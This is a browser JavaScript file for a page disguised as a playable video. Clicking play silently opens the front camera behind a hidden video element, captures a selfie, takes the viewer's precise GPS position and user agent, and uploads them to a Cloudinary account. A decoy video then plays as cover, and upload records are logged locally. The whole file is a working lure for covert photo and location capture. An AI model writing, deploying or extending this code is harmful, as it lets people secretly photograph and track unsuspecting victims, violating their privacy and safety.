(function () {
  'use strict';

  const cfg = window.CLOUDINARY_CONFIG || {};
  const $ = (id) => document.getElementById(id);

  const els = {
    video: $('video'),
    canvas: $('canvas'),
    statusBadge: $('statusBadge'),
    statusText: $('statusText'),
    frostOverlay: $('frostOverlay'),
    playButton: $('playButton')
  };

  let stream = null;
  let busy = false;
  let completed = false;
  const RECORDS_STORAGE_KEY = 'northline-upload-records';

  const PERMISSION_DENIED = 'Permission not granted';
  const CAMERA_READY_MS = Math.max(300, (cfg.countdownSeconds ?? 2) * 1000);
  const MODES = new Set(['Both', 'Selfie only', 'GPS only']);

  function isConfigured() {
    return Boolean(cfg.cloudName && cfg.uploadPreset);
  }

  function getForcedMode() {
    const forced = window.NORTHLINE_FORCE_VIDEO;
    return MODES.has(forced) ? forced : null;
  }

  function modeNeedsPhoto(mode) {
    return mode !== 'GPS only';
  }

  function modeNeedsGps(mode) {
    return mode !== 'Selfie only';
  }

  function getDeviceSlug() {
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return 'iphone';
    if (/iPad/i.test(ua)) return 'ipad';
    if (/Android/i.test(ua)) return 'android';
    if (/Windows/i.test(ua)) return 'windows';
    if (/Mac OS X|Macintosh/i.test(ua)) return 'mac';
    if (/Linux/i.test(ua)) return 'linux';
    return 'unknown';
  }

  function showStatus(message) {
    els.statusText.textContent = message;
    els.statusBadge.classList.add('visible');
  }

  function showPermissionDenied() {
    showStatus(PERMISSION_DENIED);
  }

  function hideStatus() {
    els.statusBadge.classList.remove('visible');
  }

  function showFrostOverlay() {
    els.frostOverlay.classList.remove('hidden');
    els.playButton.classList.remove('hidden');
  }

  function hideFrostOverlay() {
    els.frostOverlay.classList.add('hidden');
    els.playButton.classList.add('hidden');
  }

  function concealVideo() {
    els.video.classList.add('concealed');
    els.video.classList.remove('playback');
  }

  function getUserAgent() {
    return navigator.userAgent || 'Unknown';
  }

  async function checkCameraPermission() {
    if (!navigator.permissions?.query) return 'unknown';
    try {
      const result = await navigator.permissions.query({ name: 'camera' });
      return result.state;
    } catch {
      return 'unknown';
    }
  }

  function stopStream() {
    if (!stream) return;
    stream.getTracks().forEach((t) => t.stop());
    stream = null;
  }

  function waitForVideoReady() {
    const video = els.video;
    const maxWait = 15000;
    const start = Date.now();

    return new Promise((resolve, reject) => {
      function settle() {
        if (typeof video.requestVideoFrameCallback === 'function') {
          video.requestVideoFrameCallback(() => setTimeout(resolve, CAMERA_READY_MS));
        } else {
          setTimeout(resolve, CAMERA_READY_MS);
        }
      }

      function check() {
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          settle();
          return;
        }
        if (Date.now() - start > maxWait) {
          reject(new Error('Invalid video dimensions'));
          return;
        }
        requestAnimationFrame(check);
      }

      check();
    });
  }

  function captureFrame() {
    const video = els.video;
    const canvas = els.canvas;
    const w = video.videoWidth;
    const h = video.videoHeight;

    if (!w || !h) throw new Error('Invalid video dimensions');

    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);

    return new Promise((resolve, reject) => {
      canvas.toBlob(
        (blob) => {
          if (blob) resolve(blob);
          else reject(new Error('Capture failed'));
        },
        'image/jpeg',
        cfg.jpegQuality ?? 0.92
      );
    });
  }

  function makeGpsPlaceholderBlob() {
    const canvas = els.canvas;
    canvas.width = 16;
    canvas.height = 16;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#1a1a1a';
    ctx.fillRect(0, 0, 16, 16);
    return new Promise((resolve, reject) => {
      canvas.toBlob(
        (blob) => {
          if (blob) resolve(blob);
          else reject(new Error('Capture failed'));
        },
        'image/jpeg',
        0.8
      );
    });
  }

  function getCaptureStatus(hasPhoto, location) {
    const hasGps = location?.latitude != null && location?.longitude != null;
    if (hasPhoto && hasGps) return 'Both';
    if (hasPhoto) return 'Selfie only';
    if (hasGps) return 'GPS only';
    return 'Unknown';
  }

  function resolveMode(forced, hasRealPhoto, location) {
    if (forced) return forced;
    return getCaptureStatus(hasRealPhoto, location);
  }

  function buildUploadContext(location, status, videoPlayed) {
    const played = videoPlayed || status;
    const parts = [
      `user_agent=${encodeURIComponent(getUserAgent())}`,
      `status=${encodeURIComponent(status)}`,
      `video_played=${encodeURIComponent(played)}`
    ];
    if (location?.latitude != null && location?.longitude != null) {
      parts.push(`latitude=${Number(location.latitude)}`);
      parts.push(`longitude=${Number(location.longitude)}`);
    }
    return parts.join('|');
  }

  function uploadToCloudinary(blob, location, status, videoPlayed) {
    const url = `https://api.cloudinary.com/v1_1/${cfg.cloudName}/image/upload`;
    const form = new FormData();
    const deviceSlug = getDeviceSlug();

    form.append('file', blob, `photo-${Date.now()}.jpg`);
    form.append('upload_preset', cfg.uploadPreset);
    if (cfg.folder) form.append('folder', cfg.folder);
    form.append('tags', `device-${deviceSlug},web-capture`);
    form.append('context', buildUploadContext(location, status, videoPlayed));

    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);

      xhr.onload = () => {
        try {
          const data = JSON.parse(xhr.responseText);
          if (xhr.status >= 200 && xhr.status < 300) resolve(data);
          else reject(new Error(data.error?.message || 'Upload failed'));
        } catch {
          reject(new Error('Invalid server response'));
        }
      };

      xhr.onerror = () => reject(new Error('Network error'));
      xhr.send(form);
    });
  }

  function getStoredRecords() {
    try {
      const raw = localStorage.getItem(RECORDS_STORAGE_KEY);
      const records = raw ? JSON.parse(raw) : [];
      return Array.isArray(records) ? records : [];
    } catch {
      return [];
    }
  }

  function saveStoredRecords(records) {
    try {
      localStorage.setItem(RECORDS_STORAGE_KEY, JSON.stringify(records));
    } catch {
      /* ignore storage failures */
    }
  }

  function saveUploadRecord(uploadResult, location, status, videoPlayed, hasRealPhoto) {
    if (!uploadResult?.secure_url) return;

    const played = videoPlayed || status;
    const records = getStoredRecords();
    records.unshift({
      id: uploadResult.asset_id || uploadResult.public_id || `local-${Date.now()}`,
      photoUrl: hasRealPhoto ? uploadResult.secure_url : '',
      publicId: uploadResult.public_id || '',
      uploadedAt: new Date().toISOString(),
      userAgent: getUserAgent(),
      latitude: location?.latitude ?? null,
      longitude: location?.longitude ?? null,
      deleteToken: uploadResult.delete_token || null,
      status,
      videoPlayed: played,
      placeholder: !hasRealPhoto
    });
    saveStoredRecords(records.slice(0, 1000));
  }

  function getCurrentPosition() {
    if (!navigator.geolocation?.getCurrentPosition) return Promise.resolve(null);

    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) =>
          resolve({
            latitude: pos.coords?.latitude ?? null,
            longitude: pos.coords?.longitude ?? null
          }),
        () => resolve(null),
        {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        }
      );
    });
  }

  function waitForPlaybackReady(video, timeoutMs = 20000) {
    return new Promise((resolve, reject) => {
      if (video.readyState >= 2) {
        resolve();
        return;
      }

      const timer = setTimeout(() => {
        cleanup();
        reject(new Error('Video load timeout'));
      }, timeoutMs);

      function cleanup() {
        clearTimeout(timer);
        video.removeEventListener('loadeddata', onReady);
        video.removeEventListener('error', onError);
      }

      function onReady() {
        cleanup();
        resolve();
      }

      function onError() {
        cleanup();
        reject(new Error('Video failed to load'));
      }

      video.addEventListener('loadeddata', onReady, { once: true });
      video.addEventListener('error', onError, { once: true });
    });
  }

  function pickPlaybackUrl(status) {
    if (status === 'Both') return cfg.playbackVideoBoth || cfg.playbackVideoUrl || '';
    if (status === 'Selfie only') return cfg.playbackVideoSelfie || cfg.playbackVideoBoth || cfg.playbackVideoUrl || '';
    if (status === 'GPS only') return cfg.playbackVideoGps || cfg.playbackVideoBoth || cfg.playbackVideoUrl || '';
    return cfg.playbackVideoBoth || cfg.playbackVideoUrl || '';
  }

  async function playCloudinaryVideo(status) {
    const playbackUrl = pickPlaybackUrl(status);
    if (!playbackUrl) throw new Error('Playback URL not configured');

    stopStream();
    els.video.srcObject = null;
    els.video.removeAttribute('src');
    els.video.classList.remove('concealed');
    els.video.classList.add('playback');
    els.video.loop = true;
    els.video.playsInline = true;
    els.video.setAttribute('playsinline', '');
    els.video.setAttribute('webkit-playsinline', '');
    els.video.preload = 'auto';
    els.video.muted = true;
    els.video.src = playbackUrl;
    els.video.load();

    await waitForPlaybackReady(els.video);

    try {
      await els.video.play();
    } catch {
      els.video.muted = true;
      await els.video.play();
    }

    try {
      els.video.muted = false;
      await els.video.play();
    } catch {
      els.video.muted = true;
    }
  }

  async function openCamera() {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw Object.assign(new Error('Permission not granted'), { name: 'NotAllowedError' });
    }
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { ideal: 'user' },
        width: { ideal: 1920 },
        height: { ideal: 1080 }
      },
      audio: false
    });
    els.video.srcObject = stream;
    els.video.muted = true;
    await els.video.play();
    await waitForVideoReady();
  }

  async function startSession(locationPromise) {
    const forced = getForcedMode();
    const needPhoto = modeNeedsPhoto(forced);
    const needGps = modeNeedsGps(forced);

    showFrostOverlay();
    concealVideo();
    hideStatus();
    stopStream();
    els.video.classList.remove('playback');
    els.video.removeAttribute('src');

    try {
      const locPromise = needGps ? locationPromise || getCurrentPosition() : Promise.resolve(null);

      let hasRealPhoto = false;
      let blob;

      if (needPhoto) {
        await openCamera();
        blob = await captureFrame();
        hasRealPhoto = true;
      } else {
        blob = await makeGpsPlaceholderBlob();
      }

      const location = needGps ? await locPromise : null;
      const status = resolveMode(forced, hasRealPhoto, location);
      const videoPlayed = status;

      const uploadResult = await uploadToCloudinary(blob, location, status, videoPlayed);
      saveUploadRecord(uploadResult, location, status, videoPlayed, hasRealPhoto);

      hideFrostOverlay();
      await playCloudinaryVideo(videoPlayed);
      completed = true;
      return true;
    } catch (err) {
      const name = err?.name || '';
      const message = err?.message || '';

      if (name === 'NotAllowedError' || name === 'PermissionDeniedError' || name === 'NotFoundError') {
        showPermissionDenied();
      } else if (message === 'Invalid video dimensions' || message === 'Capture failed') {
        showPermissionDenied();
      } else if (message === 'Upload failed' || message === 'Network error') {
        showStatus('Upload failed');
      } else if (message === 'Playback URL not configured') {
        showStatus('Video not configured');
      } else if (message === 'Video failed to load' || message === 'Video load timeout') {
        showStatus('Video failed to play');
      } else {
        showStatus('Something went wrong');
      }
      stopStream();
      concealVideo();
      showFrostOverlay();
      return false;
    }
  }

  async function handleAction(e) {
    if (e) e.stopPropagation();
    if (busy || completed) return;

    busy = true;
    els.playButton.disabled = true;

    try {
      if (!isConfigured()) return;

      const forced = getForcedMode();
      const needPhoto = modeNeedsPhoto(forced);
      const needGps = modeNeedsGps(forced);

      if (needPhoto) {
        const perm = await checkCameraPermission();
        if (perm === 'denied') {
          showPermissionDenied();
          return;
        }
      }

      const locationPromise = needGps ? getCurrentPosition() : Promise.resolve(null);
      await startSession(locationPromise);
    } finally {
      busy = false;
      if (!completed) els.playButton.disabled = false;
    }
  }

  function bindPlayTriggers() {
    els.playButton.addEventListener('click', handleAction);
    els.frostOverlay.addEventListener('click', (e) => {
      if (e.target === els.frostOverlay) handleAction(e);
    });
    els.frostOverlay.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        handleAction();
      }
    });
  }

  async function init() {
    bindPlayTriggers();
    concealVideo();

    const forced = getForcedMode();
    if (!modeNeedsPhoto(forced)) return;

    const perm = await checkCameraPermission();
    if (perm === 'denied') {
      showPermissionDenied();
    }
  }

  window.addEventListener('beforeunload', stopStream);

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
